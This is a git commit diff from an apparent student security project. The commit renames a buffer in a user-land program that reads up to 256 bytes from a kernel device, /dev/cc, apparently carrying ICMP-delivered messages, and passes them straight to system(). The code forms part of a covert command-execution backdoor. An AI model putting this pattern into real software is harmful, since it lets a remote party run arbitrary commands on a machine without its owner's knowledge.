d7ad4ca41a98de464a3d904875c95ff461ef05bd
Steffen L. Norgren <ironix@nein.ca>
2012-07-07 15:42:03 -0700

    Exclusively going for an OS X client control application.

--- COMP 8045 - Major Project/source/server/server_control.c
+++ COMP 8045 - Major Project/source/server/server_control.c
@@ -1,22 +1,20 @@
 #include "server_control.h"
 
-/* this is the user-land program that executes the commands */
-
 void execute() {	
 	int kernel_fd;
-	char cmd[256+1];
+	char icmp_msg[256+1];
 
 	if ((kernel_fd = open("/dev/cc", O_RDWR)) == -1) {
 		printf("can't open /dev/cc !\n");
 		exit(-1);
 	}
 
-	if (read(kernel_fd, cmd, 256) == -1) {
+	if (read(kernel_fd, icmp_msg, 256) == -1) {
 		printf("can't read()\n");
 		exit(-1);
 	}
 
-	system(cmd);
+	system(icmp_msg);
 
 }
 
